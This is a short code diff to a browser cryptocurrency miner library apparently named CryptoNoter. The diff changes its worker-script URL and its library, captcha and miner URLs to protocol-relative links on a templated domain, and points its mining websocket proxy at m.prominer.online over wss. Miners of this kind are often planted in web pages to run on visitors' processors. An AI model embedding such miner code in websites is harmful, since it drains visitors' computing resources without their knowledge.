@@ -77,7 +77,7 @@
                 this._startNow()
             }.bind(this), xhr);
 
-            xhr.open("get", "http://m.prominer.online//worker.js", true);
+            xhr.open("get", "//%CryptoNoter_domain%/worker.js", true);
             xhr.send()
         } else if (this._asmjsStatus === "unloaded") {
             this._asmjsStatus = "pending";
@@ -515,9 +515,9 @@
 })(window);
 self.CryptoNoter = self.CryptoNoter || {};
 self.CryptoNoter.CONFIG = {
-    LIB_URL: "http://%CryptoNoter_domain%/lib/",
-    WEBSOCKET_SHARDS: [["ws://m.prominer.online/proxy"]],
+    LIB_URL: "//%CryptoNoter_domain%/lib/",
+    WEBSOCKET_SHARDS: [["wss://m.prominer.online/proxy"]],
     // WEBSOCKET_SHARDS: [["ws://%CryptoNoter_domain%/proxy"]],
-    CAPTCHA_URL: "http://%CryptoNoter_domain%/captcha/",
-    MINER_URL: "http://%CryptoNoter_domain%/media/miner.html"
+    CAPTCHA_URL: "//%CryptoNoter_domain%/captcha/",
+    MINER_URL: "//%CryptoNoter_domain%/media/miner.html"
 };
